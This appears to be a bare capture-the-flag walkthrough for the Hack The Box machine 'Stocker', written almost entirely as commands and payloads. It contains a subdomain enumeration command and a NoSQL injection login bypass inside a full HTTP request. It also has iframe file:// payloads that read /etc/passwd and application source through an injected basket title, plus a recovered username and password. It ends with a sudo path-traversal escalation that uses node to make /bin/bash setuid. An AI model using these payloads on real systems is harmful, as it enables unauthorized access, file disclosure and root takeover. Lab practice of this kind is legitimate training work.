```
gobuster vhost  -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u stocker.htb -t 50 --append-domain


NOSQL injection
{"username": {"$ne": null}, "password": {"$ne": null} }

POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: connect.sid=s%3AV-DjEiSRN7LL9VN9I7BhtTnvb0tvBwoz.SkECxzi4AYYSJPTOplEru9F3yPV7p1SbQx6kVto9AyM
Connection: close

{"username": {"$ne": null}, "password": {"$ne": null} }


{"basket":[{"_id":"638f116eeb060210cbd83a93","title":"<iframe src=file:///etc/passwd height=1050px width=800px</iframe>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}

{"basket":[{"_id":"638f116eeb060210cbd83a93","title":"<iframe src=file:///etc/nginx/nginx.conf height=1050px width=800px</iframe>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}

{"basket":[{"_id":"638f116eeb060210cbd83a93","title":"<iframe src=file:///var/www/dev/index.js height=1050px width=800px</iframe>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}

username: angoose
Password: IHeardPassphrasesArePrettySecure


sudo -l anything *.js will be executed

echo "require('child_process').exec('chmod u+s /bin/bash')" > test.js

sudo /usr/bin/node /usr/local/scripts/../../../../../dev/shm/test.js

bash -p

whoami roto

```


https://www.hackthebox.com/achievement/machine/336799/523
